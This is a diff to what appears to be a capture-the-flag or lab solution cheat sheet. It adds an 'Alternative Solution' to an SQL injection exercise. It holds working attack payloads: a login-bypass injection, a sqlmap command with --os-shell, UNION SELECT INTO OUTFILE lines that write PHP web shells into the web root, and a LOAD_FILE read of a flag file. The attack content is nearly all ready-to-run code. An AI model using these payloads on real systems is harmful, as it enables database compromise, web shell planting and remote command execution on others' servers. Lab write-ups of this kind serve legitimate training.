@@ -102,3 +102,10 @@ Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-
 ``` admin' or '1'='1'-- - ```
 #### After the login (copy the the request from the browser as cURL):
 ``` sqlmap 'http://94.237.62 <SNIP> .php' -H 'Cookie: PHPSESSID=avgi9hf5r3hj0kfuh4573o7rr6' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'search=sdsdsds' --data 'search=*' --os-shell --batch ```
+
+#### Alternative Solution:
+```
+' union select "",'<?php system(pwd); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -
+' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell2.php'-- -
+' UNION SELECT 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -
+```
